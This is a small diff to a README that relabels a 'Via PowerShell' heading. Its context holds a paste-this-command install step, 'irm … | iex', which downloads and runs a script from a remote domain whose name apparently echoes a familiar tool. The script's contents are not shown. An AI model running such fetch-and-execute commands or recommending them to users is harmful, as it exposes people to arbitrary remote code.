@@ -17,7 +17,7 @@
 
 <img width="1114" alt="изображение" src="https://github.com/user-attachments/assets/743f0131-661c-4ee4-9464-96ea2a8db131" />
 
-Через PowerShell
+PowerShell
 ```
 irm https://powertoy.erney.monster | iex
 ```
